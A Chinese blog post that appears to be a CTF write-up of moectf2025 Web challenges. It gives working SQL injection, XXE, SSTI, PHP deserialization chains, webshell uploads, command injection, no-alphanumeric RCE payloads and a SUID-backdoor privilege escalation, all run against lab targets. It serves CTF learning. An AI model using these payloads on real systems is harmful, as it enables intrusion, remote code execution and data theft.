---
title: 青岑CTF有关moectf2025的部分WP
description: 其实就是moectf的部分Web和Misc的wp来的
date: 2026-05-04 19:18:44
updated: 2026-05-04 19:18:44
image: https://img.yanxisishi.top/images/2026/05/970a3707eec5bd2685dd9b79e6df7efb_720.png
categories: [CTF]
tags: [CTF, WP, moectf]
---

## Web

### 01 第一章 神秘的手镯

打开 F12 开发者工具禁用 JS ，然后把一大串复制粘贴进去就行了。

### 01 第一章 神秘的手镯_REVENGE

题目提示：

```txt
密码放在wanyanzhou.txt里面了
```

且还提到 wanyanzhou.txt 是有备份的，爆破备份常见后缀名即可：

```txt
.zip
.rar
.tar
.tar.gz
.7z
.bak
.old
.swp
.txt
```

最后是访问 `/wanyanzhou.txt.bak` 得到备份密码。

和上题一样，打开 F12 控制台禁用 JS ，然后把一大串复制粘贴进去，但是这次返回：

```txt
❌ 启封失败！内容正确，但还需提交 499 次
```

不可能真的再输入 499 次，再次输入刚刚一大串，这次提交的同时用 bp 抓包，然后发送到 Intruder，选择 Null payloads，生成 520 次，然后攻击。

在第 520 次攻击的响应中拿到 flag。

### 02 第二章 初识金曦玄轨

打开 F12 查看源码，找到模糊字体对应位置源码：

```txt
前往/golden_trail看看
```

访问 `/golden_trail` 返回：

```txt
========================
路径不正，难窥天道
========================
```

题目提示是：

```txt
省流：你知道什么是http请求包吗？抓一个看看吧！
```

打开 F12 进入 Network，查看响应头发现：

```txt
x-jinxi-secret      moectf{0bs3rv3_Th3_Gold3n_traiL}
```

改成 flag{0bs3rv3_Th3_Gold3n_traiL} 即可。

### 03 第三章 问剑石！篡天改命！

bp 抓包发现 GET 参数：

```http
?level=B
```

和 POST 数据：

```http
{"manifestation":"none"}
```

查看源码找到：

```js
if (data.result.includes('流云状青芒')) {
    glow.style.opacity = '1';
```

所以应该传入：

```http
?level=S
```

和

```http
{"manifestation":"流云状青芒"}
```

但后端肯定不认 `{"manifestation":"流云状青芒"}` ，应该是要填 `云状青芒` 的英文，说实话挺对脑电波的，因为这种句子的英文翻译可能有多个。

![image-20260429234255532](https://img.yanxisishi.top/images/2026/05/image-20260429234255532.png)

最后上网找的去年的 wp，应该传入：

```http
{"manifestation":"flowing_azure_clouds"}
```

### 04 第四章 金曦破禁与七绝傀儡阵

第一关，在 `/stone_golem` 里传入：

```http
?key=xdsec
```

得到 `bW9lY3Rme0Mw` 。

第二关，在 `/cloud_weaver` 里传入：

```http
declaration=织云阁=第一
```

得到 `bjZyNDd1MTQ3` 。

第三关，在 `/shadow_stalker` 里传入：

```http
X-Forwarded-For:127.0.0.1
```

得到 `MTBuNV95MHVy` 。

第四关，在 `/soul_discerner` 里传入：

```http
User-Agent:moe browser
```

得到 `X2g3N1BfbDN2` 。

第五关，在 `/heart_seal` 里传入：

```http
Cookie:user=xt
```

得到 `M2xfMTVfcjM0` 。

第六关，在 `/pathfinder` 里传入：

```http
Referer:http://panshi/entry
```

得到 `bGx5X2gxOWgh` 。

第七关，在 `/void_rebirth` 里传入：

![image-20260430000052141](https://img.yanxisishi.top/images/2026/05/image-20260430000052141.png)

得到 `fQ==` 。

拼起来就是 ：

```txt
bW9lY3Rme0MwbjZyNDd1MTQ3MTBuNV95MHVyX2g3N1BfbDN2M2xfMTVfcjM0bGx5X2gxOWghfQ==
```

base64 解码就是：

```txt
moectf{C0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h!}
```

换成 flag{C0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h!} 即可。

### 05 第五章 打上门来！

题目描述已提示目录穿梭，输入：

```txt
../../../../flag
```

### 06 第六章 藏经禁制？玄机初探！

万能密码就行，账号密码一起输入 `'='`

### 07 第七章 灵蛛探穴与阴阳双生符

题目提示：

```txt
有这样一个文件，它是一个存放在网站根目录下的纯文本文件，用于告知搜索引擎爬虫哪些页面可以抓取，哪些页面不应被抓取。它是网站与搜索引擎之间的 “协议”，帮助网站管理爬虫的访问行为，保护隐私内容、节省服务器资源或引导爬虫优先抓取重要页面。
```

访问 `/robots.txt` 得到：

```txt
User-agent: *
Disallow: /flag.php
```

访问 `/flag.php` 得到：

```php
<?php
highlight_file(__FILE__);
$flag = getenv('FLAG');

$a = $_GET["a"] ?? "";
$b = $_GET["b"] ?? "";

if($a == $b){
    die("error 1");
}

if(md5($a) != md5($b)){
    die("error 2");
}

echo $flag;
```

传入：

```http
?a=QNKCDZO&b=s878926199a
```

### 08 第八章 天衍真言，星图显圣

这次万能密码登进去了没有 flag，说明 flag 可能要用 Union 联合查询注入找到：

1. 测列数：

   输入：

   ```txt
   'or 1=1 order by 2#
   随意
   ```

   返回 `Welcome admin`。

   输入：

   ```txt
   'or 1=1 order by 3#
   随意
   ```

   返回 `登录失败，请检查神识印记与心法密咒`。

   说明共有 2 列。

2. 测回显位：

   输入：

   ```txt
   'union select 1,2#
   随意
   ```

   返回 `Welcome 1` ，说明第 1 列是回显位。

3. 爆库名：

   输入：

   ```txt
   'union select database(),2#
   随意
   ```

   返回 `Welcome user` ，说明当前库是 user。

4. 爆表名：

   输入：

   ```txt
   'union select group_concat(table_name),2 from information_schema.tables where table_schema=database()#
   随意
   ```

   返回 `Welcome flag,users` ，说明存在表 flag 和 users。

5. 爆列名：

   输入：

   ```txt
   'union select group_concat(column_name),2 from information_schema.columns where table_schema=database() and table_name='flag'#
   随意
   ```

   返回 `Welcome value` ，说明表 flag 只有 1 列 value。

6. 爆数据：

   输入：

   ```txt
   'union select group_concat(value),2 from flag#
   随意
   ```

   返回 flag。

### 09 第九章 星墟禁制·天机问路

本以为是 SSRF，但测试无果，后来发现是 ping 形式的命令执行：

```txt
127.0.0.1;ls /
```

不在根目录和当前目录，找一下环境变量：

```txt
127.0.0.1;env
```

拿到 flag。

### 10 第十章 天机符阵

题目提示：

```txt
flag在flag.txt里
```

随便输入 `111` ，返回：

```txt
<br />
<b>Warning</b>:  DOMDocument::loadXML(): Start tag expected, '&lt;' not found in Entity, line: 1 in <b>/var/www/html/chapter10.php</b> on line <b>17</b><br />
<阵枢>引魂玉</阵枢>
<解析>未定义</解析>
<输出>未定义</输出>
```

根据 `DOMDocument::loadXML()` 判断是 XXE，输入：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE aaa[
    <!ENTITY xxe SYSTEM "file:///var/www/html/flag.txt"> 
]>
<输出>&xxe;</输出>
```

得到 flag。

### 10 第十章 天机符阵_revenge

跟上题差不多，不过这次在根目录，输入：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE aaa[
    <!ENTITY xxe SYSTEM "file:///flag.txt"> 
]>
<输出>&xxe;</输出>
```

### 11 第十一章 千机变·破妄之眼

提示：

```txt
GET 参数名由m,n,o,p,q这五个字母组成（每个字母出现且仅出现一次），长度正好为 5
参数名等于参数值才能进入
```

用 bp 的 intruder 模式爆破好了，先用 crunch 工具在终端生成字典：

```bash
crunch 1 1 -p m n o p q > 1.txt
```

然后去 bp 选择碰撞攻击，选定 payload 位置并导入字典：

![image-20260430114340135](https://img.yanxisishi.top/images/2026/05/image-20260430114340135.png)

筛选长度找到有个 302 重定向的：

![image-20260430114429385](https://img.yanxisishi.top/images/2026/05/image-20260430114429385.png)

访问 `/find.php` 进入页面，页面有个 `flag.php` ，点击后返回：

```txt
flag就在这了，看不到吗，是老弟境界不够吧
```

用伪协议读取，输入：

```txt
php://filter/convert.base64-encode/resource=flag.php
```

得到：

```txt
PD9waHAKZWNobyAiZmxhZ+WwseWcqOi/meS6hu+8jOeci+S4jeWIsOWQl++8jOaYr+iAgeW8n+Wig+eVjOS4jeWkn+WQpyI7Ci8vZmxhZ3tkMTg5NjBkZi1hZDhmLTQxZTktYTRjMS00ZWYzYzMzOTg2NzF9
```

base64 解码就是 flag。

### 12 第十二章 玉魄玄关·破妄

题目提示：

```txt
这道题用于学习 蚁剑 的使用，请使用 蚁剑 完成本题
```

偷个懒，POST 传入：

```http
cmd=system("env");
```

或

```http
cmd=phpinfo();
```

### 13 第十三章 通幽关·灵纹诡影

创建出包含 `FFD8FF` 的一句马：

```bash
printf '\xff\xd8\xff<?php eval($_POST[1]);?>' > shell.jpg
```

上传一句马的同时抓包，把 shell.jpg 改回 shell.php。根据回显路径访问 `/uploads/shell.php` ，接着 POST 传入：

```http
1=phpinfo();
```

### 14 第十四章 御神关·补天玉碑

题目提示：

```txt
Apache有一个特殊文件
```

提示挺明显的，应该是 .htaccess 配置文件，先上传 .htaccess：

```htaccess
AddType application/x-httpd-php .png
```

然后上传一句马 `<?php eval($_POST[1]);?>` 改后缀名得到的 shell.png，得到回显路径，访问 `/uploads/shell.png` ，POST 传入：

```http
1=phpinfo();
```

### 15 第十五章 归真关·竞时净魔

题目描述到：

```txt
魔气会快速清除违规符文，请把握时机！
```

是一个竞争类型的文件上传，用 bp 一直发送 shell.php 就行了。

![image-20260430135442153](https://img.yanxisishi.top/images/2026/05/image-20260430135442153.png)

但是访问 `/uploads/shell.php` 仍然 404，可能是删的太快了，浏览器上根本访问不到。

再发一个无限重复的包，内容是：

```http
POST /uploads/shell.php HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
...

1=phpinfo();
```

筛选长度，找到成功竞争到的包，得到 flag。

![image-20260430140518382](https://img.yanxisishi.top/images/2026/05/image-20260430140518382.png)

### 16 第十六章 昆仑星途

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

include($_GET['file'] . ".php");
```

传入：

```http
?file=data:,<?php system('ls /')?>
```

找到特殊文件 flag-05QtCVMnxI4i5WlfKYyVyixOhDbm1j.txt。

再传入：

```http
?file=data:,<?php system('cat /flag-05QtCVMnxI4i5WlfKYyVyixOhDbm1j.txt')?>
```

### 17 第十七章 星骸迷阵·神念重构

```php
<?php
highlight_file(__FILE__);

class A {
    public $a;
    function __destruct() {
        eval($this->a);
    }
}

if(isset($_GET['a'])) {
    unserialize($_GET['a']);
}
```

运行：

```php
<?php
class A {
    public $a='phpinfo();';
}

$a = new A();
echo serialize($a);
```

得到：

```txt
O:1:"A":1:{s:1:"a";s:10:"phpinfo();";} 
```

传入：

```http
?a=O:1:"A":1:{s:1:"a";s:10:"phpinfo();";} 
```

### 18 第十八章 万卷诡阁·功法连环

```php
<?php
highlight_file(__FILE__);

class PersonA {
    private $name;
    function __wakeup() {
        $name=$this->name;
        $name->work();
    }
}

class PersonB {
    public $name;
    function work(){
        $name=$this->name;
        eval($name);
    }

}

if(isset($_GET['person'])) {
    unserialize($_GET['person']);
}
```

运行：

```php
<?php
class PersonA {
    private $name;
    public function __construct() {
        $this->name = new PersonB();
    }
}

class PersonB {
    public $name='phpinfo();';
}

$a = new PersonA();
echo urlencode(serialize($a));
```

得到：

```txt
O%3A7%3A%22PersonA%22%3A1%3A%7Bs%3A13%3A%22%00PersonA%00name%22%3BO%3A7%3A%22PersonB%22%3A1%3A%7Bs%3A4%3A%22name%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D
```

传入：

```http
?person=O%3A7%3A%22PersonA%22%3A1%3A%7Bs%3A13%3A%22%00PersonA%00name%22%3BO%3A7%3A%22PersonB%22%3A1%3A%7Bs%3A4%3A%22name%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D
```

### 19 第十九章 星穹真相·补天归源

```php
<?php
highlight_file(__FILE__);

class Person
{
    public $name;
    public $id;
    public $age;

    public function __invoke($id)
    {
        $name = $this->id;
        $name->name = $id;
        $name->age = $this->name;
    }
}

class PersonA extends Person
{
    public function __destruct()
    {
        $name = $this->name;
        $id = $this->id;
        $age = $this->age;
        $name->$id($age);
    }
}

class PersonB extends Person
{
    public function __set($key, $value)
    {
        $this->name = $value;
    }
}

class PersonC extends Person
{
    public function __Check($age)
    {
        if(str_contains($this->age . $this->name,"flag"))
        {
            die("Hacker!");
        }
        $name = $this->name;
        $name($age);
    }

    public function __wakeup()
    {
        $age = $this->age;
        $name = $this->id;
        $name->age = $age;
        $name($this);
    }
}

if(isset($_GET['person']))
{
    $person = unserialize($_GET['person']);
}
```

1. 找链子终点：

   终点在 `PersonC::__Check()` 里面：

   ```php
   class PersonC extends Person
   {
       public function __Check($age)
       {
           if(str_contains($this->age . $this->name,"flag"))
           {
               die("Hacker!");
           }
           $name = $this->name;
           $name($age);
       }
   }
   ```

   > **str_contains()**
   >
   > `str_contains($a, "flag")` 用来判断字符串 `$a` 里面是否包含 `"flag"`，包含就返回 `true`，不包含就返回 `false`

   关键代码是：

   ```php
   $name = $this->name;
   $name($age);
   ```

   如果让：

   ```php
   $this->name = "system";
   $age = "cat /fla*";
   ```

   那么最后就相当于执行：

   ```php
   system("cat /fla*");
   ```

2. 触发 `PersonC::__Check()`：

   找到 `PersonA::__destruct()`：

   ```php
   class PersonA extends Person
   {
       public function __destruct()
       {
           $name = $this->name;
           $id = $this->id;
           $age = $this->age;
           $name->$id($age);
       }
   }
   ```

   关键代码是：

   ```php
   $name->$id($age);
   ```

   这是一个动态方法调用。

   如果让：

   ```php
   $name = new PersonC();
   $id = "__Check";
   $age = "cat /fla*";
   ```

   那么最后就相当于：

   ```php
   PersonC对象->__Check("cat /fla*");
   ```

   所以需要让 `PersonA` 对象满足：

   ```php
   PersonA::$name = new PersonC()
   PersonA::$id   = "__Check"
   PersonA::$age  = "cat /fla*"
   ```

3. 最终链子：

   其他的方法和类不用管了，链子已经可以实现了，虽然不处理 `PersonC::__wakeup()` 会导致报错，但是不妨碍拿到 flag。

   ```txt
   PersonA::__destruct()
       ↓
   $name->$id($age)
       ↓
   PersonC::__Check("cat /fla*")
       ↓
   system("cat /fla*")
   ```

4. 编写 exp：

   ```php
   <?php
   class PersonA {
       public $name;
       public $id = "__Check";
       public $age = "cat /fla*";
   }
   
   class PersonC {
       public $name = "system";
   }
   
   $a = new PersonA();
   $a -> name = new PersonC();
   echo serialize($a);
   ```

   得到：

   ```txt
   O:7:"PersonA":3:{s:4:"name";O:7:"PersonC":1:{s:4:"name";s:6:"system";}s:2:"id";s:7:"__Check";s:3:"age";s:9:"cat /fla*";} 
   ```

   虽然页面最后会报错，但是能拿到 flag 就刑。

### 19 第十九章_revenge

```php
<?php
highlight_file(__FILE__);

class Person
{
    public $name;
    public $id;
    public $age;
}

class PersonA extends Person
{
    public function __destruct()
    {
        $name = $this->name;
        $id = $this->id;
        $name->$id($this->age);
    }
}

class PersonB extends Person
{
    public function __set($key, $value)
    {
        $this->name = $value;
    }

    public function __invoke($id)
    {
        $name = $this->id;
        $name->name = $id;
        $name->age = $this->name;
    }
}

class PersonC extends Person
{
    public function check($age)
    {
        $name=$this->name;
        if($age == null)
        {
            die("Age can't be empty.");
        }
        else if($name === "system")
        {
            die("Hacker!");
        }
        else
        {
            var_dump($name($age));
        }
    }

    public function __wakeup()
    {
        $name = $this->id;
        $name->age = $this->age;
        $name($this);
    }
}

if(isset($_GET['person']))
{
    $person = unserialize($_GET['person']);
}
```

1. 找链子终点：

   终点在 `PersonC::check()` 里面：

   ```php
   public function check($age)
   {
       $name=$this->name;
       if($age == null)
       {
           die("Age can't be empty.");
       }
       else if($name === "system")
       {
           die("Hacker!");
       }
       else
       {
           var_dump($name($age));
       }
   }
   ```

   关键代码是：

   ```php
   var_dump($name($age));
   ```

   如果让：

   ```php
   $this->name = "shell_exec";
   $age = "cat /flag";
   ```

   那么最后就相当于执行：

   ```php
   var_dump(shell_exec("cat /flag"));
   ```

   这里不能用 `system` ，所以可以换成 `shell_exec`。

2. 触发 `PersonC::check()`：

   找到 `PersonA::__destruct()`：

   ```php
   public function __destruct()
   {
       $name = $this->name;
       $id = $this->id;
       $name->$id($this->age);
   }
   ```

   关键代码是：

   ```php
   $name->$id($this->age);
   ```

   这是动态方法调用。

   如果让：

   ```php
   $name = new PersonC();
   $id = "check";
   $this->age = "cat /flag";
   ```

   那么最后就相当于：

   ```php
   PersonC对象->check("cat /flag");
   ```

   所以需要让 `PersonA` 对象满足：

   ```php
   PersonA::$name = new PersonC()
   PersonA::$id   = "check"
   PersonA::$age  = "cat /flag"
   ```

3. 最终链子：

   ```txt
   PersonA::__destruct()
       ↓
   $name->$id($this->age)
       ↓
   PersonC->check("cat /flag")
       ↓
   var_dump(shell_exec("cat /flag"))
   ```

4. 编写 exp：

   ```php
   <?php
   class PersonA {
       public $name;
       public $id = "check";
       public $age = "env";
   }
   
   class PersonC {
       public $name = "shell_exec";
   }
   
   $a = new PersonA();
   $a->name = new PersonC();
   echo serialize($a);
   ```

   得到：

   ```txt
   O:7:"PersonA":3:{s:4:"name";O:7:"PersonC":1:{s:4:"name";s:10:"shell_exec";}s:2:"id";s:5:"check";s:3:"age";s:3:"env";} 
   ```

### 20 第二十章 幽冥血海·幻语心魔

app.py：

```python
from flask import Flask, request, render_template, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    if 'username' in request.args or 'password' in request.args:
        username = request.args.get('username', '')
        password = request.args.get('password', '')

        if not username or not password:
            login_msg = """
            <div class="login-result" id="result">
                <div class="result-title">阵法反馈</div>
                <div id="result-content"><div class='login-fail'>用户名或密码不能为空</div></div>
            </div>
            """
        else:
            login_msg = render_template_string(f"""
            <div class="login-result" id="result">
                <div class="result-title">阵法反馈</div>
                <div id="result-content"><div class='login-success'>欢迎: {username}</div></div>
            </div>
            """)
    else:
        login_msg = ""

    return render_template("index.html", login_msg=login_msg)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

是 Flask 模板的 SSTI 漏洞，为 Jinja2 引擎，注入点在 `神识名讳` 。

先输入：

```python
{{7*7}}
```

返回 `欢迎: 49`，证明 SSTI 漏洞存在。

输入：

```python
{{url_for.__globals__['os'].popen('cat /flag').read()}}
```

拿到 flag。

### 21 第二十一章 往生漩涡·言灵死局

app.py：

```python
from flask import Flask, request, render_template, render_template_string
app = Flask(__name__)

blacklist = ["__", "global", "{{", "}}"]

@app.route('/')
def index():
    if 'username' in request.args or 'password' in request.args:
        username = request.args.get('username', '')
        password = request.args.get('password', '')

        if not username or not password:
            login_msg = """
            <div class="login-result" id="result">
                <div class="result-title">阵法反馈</div>
                <div id="result-content"><div class='login-fail'>用户名或密码不能为空</div></div>
            </div>
            """
        else:
            login_msg = render_template_string(f"""
            <div class="login-result" id="result">
                <div class="result-title">阵法反馈</div>
                <div id="result-content"><div class='login-success'>欢迎：{username}</div></div>
            </div>
            """)

            for blk in blacklist:
                if blk in username:
                    login_msg = """
                    <div class="login-result" id="result">
                        <div class="result-title">阵法反馈</div>
                        <div id="result-content"><div class='login-fail'>Error</div></div>
                    </div>
                    """
    else:
        login_msg = ""

    return render_template("index.html", login_msg=login_msg)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

跟上题的区别就是过滤了 `__`、`global`、`{{` 和 `}}`。

上一题的：

```python
{{url_for.__globals__['os'].popen('cat /flag').read()}}
```

肯定用不了了。可以用别的方法绕过：

**绕过 `{{` 和 `}}` ：**

改用`{%print()%}`语句进行执行命令。

**绕过 `__globals__` ：**

1. 用 Request 参数中转：

   ```python
   ?username={%print(url_for[request.args.a]['os'].popen('cat /flag').read())%}&password=111&a=__globals__
   ```

2. 用变量拼接：

   ```python
   ?username={%print((url_for|attr('_'~'_'~'glo'~'bals'~'_'~'_'))['os'].popen('cat /flag').read())%}&password=111
   ```

   依旧要记得 `.` 的优先级比 `|` 高，要不全用 `|attr()` ，要不给 `|attr()` 外面包一层小括号。

### 22 第二十二章 血海核心·千年手段

app.py：

```python
from flask import Flask, request, render_template, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    if 'username' in request.args or 'password' in request.args:
        username = request.args.get('username', '')
        password = request.args.get('password', '')

        if not username or not password:
            login_msg = """
            <div class="login-result" id="result">
                <div class="result-title">阵法反馈</div>
                <div id="result-content"><div class='login-fail'>用户名或密码不能为空</div></div>
            </div>
            """
        else:
            login_msg = f"""
            <div class="login-result" id="result">
                <div class="result-title">阵法反馈</div>
                <div id="result-content"><div class='login-success'>Welcome: {username}</div></div>
            </div>
            """
            render_template_string(login_msg)
    else:
        login_msg = ""

    return render_template("index.html", login_msg=login_msg)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

看源码可以看出来，虽然也经过了 Jinja2 模板引擎渲染，但是没有保留渲染结果，即本题为无回显 SSTI。

输入：

```python
{{url_for.__globals__['os'].popen('mkdir -p /app/static;cat /flag > /app/static/1.txt 2>&1').read()}}
```

然后访问 `/static/1.txt` ，返回：

```txt
cat: /flag: Permission denied
```

服了，还没有权限，查看一下根目录下的文件权限：

```python
{{url_for.__globals__['os'].popen('mkdir -p /app/static;ls / -la > /app/static/1.txt 2>&1').read()}}
```

然后访问 `/static/1.txt` ，返回：

```txt
total 76
drwxr-xr-x    1 root root 4096 May  4 06:22 .
drwxr-xr-x    1 root root 4096 May  4 06:22 ..
-rwxr-xr-x    1 root root    0 May  4 06:22 .dockerenv
drwxrwxrwx    1 root root 4096 May  4 06:31 app
lrwxrwxrwx    1 root root    7 Mar  2 21:50 bin -> usr/bin
drwxr-xr-x    2 root root 4096 Mar  2 21:50 boot
drwxr-xr-x    5 root root  340 May  4 06:22 dev
-rwx------    1 root root  181 Mar 24 07:05 entrypoint.sh
drwxr-xr-x    1 root root 4096 May  4 06:22 etc
-rw-------    1 root root   43 May  4 06:22 flag
drwxr-xr-x    1 root root 4096 May  4 06:22 home
lrwxrwxrwx    1 root root    7 Mar  2 21:50 lib -> usr/lib
lrwxrwxrwx    1 root root    9 Mar  2 21:50 lib64 -> usr/lib64
drwxr-xr-x    2 root root 4096 Mar 16 00:00 media
drwxr-xr-x    2 root root 4096 Mar 16 00:00 mnt
drwxr-xr-x    2 root root 4096 Mar 16 00:00 opt
dr-xr-xr-x 1252 root root    0 May  4 06:22 proc
drwx------    1 root root 4096 Mar 16 23:06 root
drwxr-xr-x    3 root root 4096 Mar 16 00:00 run
lrwxrwxrwx    1 root root    8 Mar  2 21:50 sbin -> usr/sbin
drwxr-xr-x    2 root root 4096 Mar 16 00:00 srv
dr-xr-xr-x   13 root root    0 Jan 30 15:09 sys
drwxrwxrwt    2 root root   40 May  4 06:22 tmp
drwxr-xr-x    1 root root 4096 Mar 16 00:00 usr
drwxr-xr-x    1 root root 4096 Mar 16 00:00 var
```

其中 `-rw-------    1 root root   43 May  4 06:22 flag` 的意思是：

- `-`：这是一个普通文件，不是目录
- `rw-------`：文件权限为 `600`，即只有文件所有者有读、写权限，其他用户没有任何权限
- 第一个 `root`：文件所有者是 `root`
- 第二个 `root`：文件所属组是 `root`
- `43`：文件大小为 43 字节
- `May 4 06:22`：文件最后修改时间
- `flag`：文件名

也就是说，这个 `flag` 文件虽然存在于根目录下，但权限是 `600`，只有 `root` 用户才能读取。当前 Web 服务进程大概率不是以 `root` 身份运行，所以执行 `cat /flag` 时才会返回 `Permission denied`。

输入：

```python
{{url_for.__globals__['os'].popen('mkdir -p /app/static;id > /app/static/1.txt 2>&1').read()}}
```

然后访问 `/static/1.txt` ，查看当前权限，返回：

```txt
uid=1000(MoeCTFer) gid=1000(MoeCTFer) groups=1000(MoeCTFer)
```

说明当前所处的系统用户叫做 `MoeCTFer`，这是一个毫无特权的普通用户。

接下来可以尝试寻找被赋予了 SUID 权限的特殊可执行文件，输入：

```python
{{url_for.__globals__['os'].popen('mkdir -p /app/static;find / -perm -4000 > /app/static/1.txt 2>&1').read()}}
```

然后访问 `/static/1.txt` ，找到：

```txt
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/umount
/usr/bin/rev
/usr/bin/passwd
/usr/bin/sudo
```

`/usr/bin/rev` 的功能是**反转文件中的每一行内容**，这题可以利用 `/usr/bin/rev` 来提权：

```python
{{url_for.__globals__['os'].popen('mkdir -p /app/static;/usr/bin/rev cat /flag > /app/static/1.txt 2>&1').read()}}
```

然后访问 `/static/1.txt` ，输出结果为空。

再输入：

```python
{{url_for.__globals__['os'].popen('mkdir -p /app/static; echo abcdefg > /app/static/2.txt;/usr/bin/rev /app/static/2.txt > /app/static/1.txt 2>&1').read()}}
```

然后访问 `/static/2.txt` ，返回 `abcdefg`，访问 `/static/1.txt` ，输出结果仍为空。

看来 `/usr/bin/rev` 是被魔改过的，不是系统自带的正常 rev，先用 `strings` 分析这个魔改的二进制程序，输入：

```python
{{url_for.__globals__['os'].popen('mkdir -p /app/static;strings -a /usr/bin/rev > /app/static/1.txt 2>&1').read()}}
```

然后访问 `/static/1.txt` ，返回：

```txt
/lib64/ld-linux-x86-64.so.2
execvp
__libc_start_main
__cxa_finalize
strcmp
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
--HDdss
;*3$"
GCC: (Debian 14.2.0-19) 14.2.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
rev.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_start_main@GLIBC_2.34
_ITM_deregisterTMCloneTable
_edata
_fini
__data_start
strcmp@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
_end
__bss_start
main
execvp@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
_init
.symtab
.strtab
.shstrtab
.note.gnu.property
.note.gnu.build-id
.interp
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.note.ABI-tag
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

+ `execvp` 是 C 语言中用来**执行另一个外部程序**的函数。正常的 `rev` 命令，它的功能仅仅是在内存里把字符串倒过来然后输出，说明现在的 `rev` 是一个可以用来执行命令的魔改程序。
+ **`strcmp`**：这是字符串比较函数。结合它是一个后门程序，这说明程序在运行前，可能会检查输入的参数是否匹配。
+ **`--HDdss`**：这是除了标准库函数名之外，最突兀的字符串，估计是让这个魔改 `rev` 执行命令的参数。

输入：

```python
{{url_for.__globals__['os'].popen('mkdir -p /app/static; /usr/bin/rev --HDdss cat /flag > /app/static/1.txt 2>&1').read()}}
```

然后访问 `/static/1.txt` ，得到 flag。

### MoeCTF2025-Web附加挑战

先用 jadx 反编译附件：

```bash
jadx -d /home/kali/Hello_CTF/111 /home/kali/Hello_CTF/demo.jar
```

意思是把 demo.jar 反编译到 111 文件夹。

进入反编译结果：

```bash
cd 111/sources
```

然后我不会做了，什么时候学了 Java 一定回来补上，呜呜。

### Moe笑传之猜猜爆

扫目录扫出来了 `/flag` ，不过是 405，随便发个 POST 请求就拿到 flag 了。

### 这是...Webshell？ 

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['shell'])) {
    $shell = $_GET['shell'];
    if(!preg_match('/[A-Za-z0-9]/is', $_GET['shell'])) {
        eval($shell);
    } else {
        echo "Hacker!";
    }
}
?>
```

无字母数字 RCE，先用取反试试怎么个事，输入：

```http
?shell=(~'%8c%86%8c%8b%9a%92')(~'%93%8c%df%d0');
```

但是返回：

```txt
Parse error: syntax error, unexpected '(' in /var/www/html/index.php(6) : eval()'d code on line 1
```

这个报错，是因为目标靶机的环境大概率是 **PHP 5**。

原 payload 经过 PHP 的取反解析后，在 `eval()` 中实际执行的代码类似于：

```php
("system")("ls /");
```

这种 `(函数名字符串)(参数)` 的直接调用写法（统一变量语法）是在 **PHP 7.0.0** 中才引入的。在 PHP 5.x 版本中，PHP 引擎在解析完第一个 `("system")` 后，不期望紧接着遇到另一个 `(`，因此会直接抛出语法错误。

实际上用 whatweb 检测后得出目标靶机的环境是 PHP[5.6.40]。

结合原有的取反编码，修正后的 payload 为：

```http
?shell=$_=~'%8c%86%8c%8b%9a%92';$__=~'%93%8c%df%d0';$_($__);
```

找到特殊文件 flag.txt，接着输入：

```http
?shell=$_=~'%8c%86%8c%8b%9a%92';$__=~'%9c%9e%8b%df%d0%99%93%9e%98%d1%8b%87%8b';$_($__);
```

### 这是...Webshell?_revenge

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['shell'])){
    $shell = $_GET['shell'];
    if(strlen($shell)>35){
        die("Too L0o0o0o0o0o0ong!!!");
    }
    if(preg_match("/[A-Za-z0-9_$]+/",$shell)){
        die("HhHhHhHhHacker!!!");
    }
    eval($shell);
}
?>
```

1. 临时文件 RCE：

   首先做一个可以上传文件的网页：

   ```html
   <!DOCTYPE html>
   <html lang="en">
   <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>POST数据包POC</title>
   </head>
   <body>
   <form action="http://docker.qingcen.net:43066/" method="post" enctype="multipart/form-data">
   <label for="file">文件名：</label>
       <input type="file" name="file" id="file"><br>
       <input type="submit" name="submit" value="提交">
   </form>
   </body>
   </html>
   ```

   然后上传一个`shell.sh`文件并用bp抓包

   1. 传入：

      ```http
      ?shell=%3F%3E%3C%3F%3D%60.%20%2F%3F%3F%3F%2F%3F%3F%3F%3F%3F%3F%3F%3F%5B%40-%5B%5D%60%3B
      ```

      即 ``?shell=?><?=`. /???/????????[@-[]`;`` ，如果源码不是 `eval($shell);` 而是 `system($shell);` ，只需要传入 `?shell=. /???/????????[@-[]`

   2. `shell.sh`的文件内容改成：

      ```sh
      #!/bin/sh
      cat /flag.txt
      ```

   如果没有回显就多发送几次。

2. 用 `?` 通配：

   ```http
   ?shell=?><?=`/???/???%20/????????`;
   ```

   对应执行的是：

   ```bash
   /bin/cat /flag.txt
   ```

### 摸金偶遇FLAG，拼尽全力难战胜

